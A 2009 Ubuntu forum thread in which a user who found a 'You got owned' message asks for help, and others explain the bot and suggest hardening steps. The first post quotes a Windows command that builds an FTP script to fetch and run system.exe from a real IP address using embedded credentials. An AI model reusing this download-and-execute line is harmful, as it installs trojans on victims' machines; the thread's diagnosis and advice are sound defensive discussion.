---
title: "&quot;You got owned&quot; Message"
date: 2009-10-18
forum: Security
---

### Post by misterfixit on 2009-10-18
I have an Ubunty box dedicated to Ham Radio.  I hafve enabled remote desktop viewer to the bax from my other Ubuntu box in side my house.  I saw this message displayed on a terminal program which I use to program EEPROMs:

cmd /c echo open 208.248.82.3 21 >> ik &echo user hycsju hyc7186 >> ik &echo binary >> ik &echo get system.exe >> ik &echo bye >> ik &ftp -n -v -s:ik &del ik &system.exe &exit
echo You got owned


It appears to be some kind of script aimed at a Windoze box.

I did a whois:

n4cvx@n4cvx-desktop:~$ who is 208.248.82.3
n4cvx    pts/0        2009-10-18 13:19 (:0.0)

and it evidently shows my ubuntu box.  However, doing another whois for 208.248.82.3 shows this:

MCI Communications Services, Inc. d/b/a Verizon Business UUNET1996B (NET-208-192-0-0-1) 
                                  208.192.0.0 - 208.255.255.255
Hypercom UU-208-248-82 (NET-208-248-82-0-1) 
                                  208.248.82.0 - 208.248.82.255

I would appreciate any information the group might be able to provide to me.

My LAN is connected to Comcast via a Linksys cable adaptor which feeds a Linksys wired router.  There are 3 Ubuntu boxes attached, plus two networked printers and a Windoze XP PC.

Regards,

Dave

---

### Post by CharlesA on 2009-10-18
Sounds like they were trying to delete "system.exe" after "getting" it via ftp.

Do you have a password enabled for remote desktop?

EDIT: are you behind a firewall? If you are, they shouldn't be able to access the machine unless it's on the internet.

---

### Post by cariboo on 2009-10-18
It looks like you didn't have a very good password set up for remote dessktop access, and your computer has been cracked. If you want to figure out what happened, a good start would be to disconnect the network cable, and open a terminal and type:

```
history
```

You will propabaly end up having to do a reinstall.

---

### Post by falconindy on 2009-10-18
This is output typical of a bot. It creates a script file (called ik) and then pipes it back to the ftp client to download a trojan onto your computer. After executing, the trojan deletes itself and the bot deletes the script file. No harm done here, since its clearly aimed at a Windows box.

BTW, your first 'whois' execution is faulty. It's showing your own computer because of the space between 'who' and 'is'. You essentially provided (ignored) argument to the 'who' command.

---

### Post by misterfixit on 2009-10-18
> **falconindy said:**
> This is output typical of a bot. It creates a script file (called ik) and then pipes it back to the ftp client to download a trojan onto your computer. After executing, the trojan deletes itself and the bot deletes the script file. No harm done here, since its clearly aimed at a Windows box.

BTW, your first 'whois' execution is faulty. It's showing your own computer because of the space between 'who' and 'is'. You essentially provided (ignored) argument to the 'who' command.

Thanks a million for the information.  I went back through the systems and made sure that they are all set on the router by their mac address and for the router to deny any others.  Also, I changed all passwords including the ones on the router and cagble modem.  Then I followed up by asking if I really needed remote access to the ham radio computer located in my ham shack, and decided that I didn't so removed remote desktop viewer capability.  Finally, rebooted everything.

It would appear that the 'bot ftp'ed in on port (I gather this from the original ftp command by the 'bot).

I am pretty clueless on how to really tighten down my system, but wonder if installing SELinux will help?  I've heard that SELlinux is effective only if you know what you are doing when you set it's parameters.

Regards,

Dave

---

### Post by dmizer on 2009-10-18
> **misterfixit said:**
> Thanks a million for the information.  I went back through the systems and made sure that they are all set on the router by their mac address and for the router to deny any others.  Also, I changed all passwords including the ones on the router and cagble modem.  Then I followed up by asking if I really needed remote access to the ham radio computer located in my ham shack, and decided that I didn't so removed remote desktop viewer capability.  Finally, rebooted everything.

It would appear that the 'bot ftp'ed in on port (I gather this from the original ftp command by the 'bot).

I am pretty clueless on how to really tighten down my system, but wonder if installing SELinux will help?  I've heard that SELlinux is effective only if you know what you are doing when you set it's parameters.

Regards,

Dave
The command you posted only made use of FTP, it doesn't suggest in any way that the bot connected to your Ubuntu box VIA FTP (in fact, if it had made use of FTP, you probably wouldn't have seen the command). I suggest checking your /var/log/auth.log for more information.

What ports did you previously have open? Did you have any ports forwarded to your Ubuntu box? Do you have wireless attached to your LAN? There should be nothing dangerous about using remote desktop from within your local network.

'73s

---

### Post by ApEkV2 on 2009-10-18
Fail2ban
[http://www.google.com/cse?cx=002683415331144861350%3Atsq8didf9x0&q=fail2ban&ie=utf-8&sa=Search](http://www.google.com/cse?cx=002683415331144861350%3Atsq8didf9x0&q=fail2ban&ie=utf-8&sa=Search)

And don't use passwords like password or anything out of a dictionary, or anything below 10 characters long.
[http://www.passwordmeter.com/](http://www.passwordmeter.com/)

---

### Post by falconindy on 2009-10-18
> **misterfixit said:**
> ham shack
mmmmmm... ham shack...

[img]http://farm3.static.flickr.com/2357/2141808218_7bb9d4ed06.jpg[/img]

---

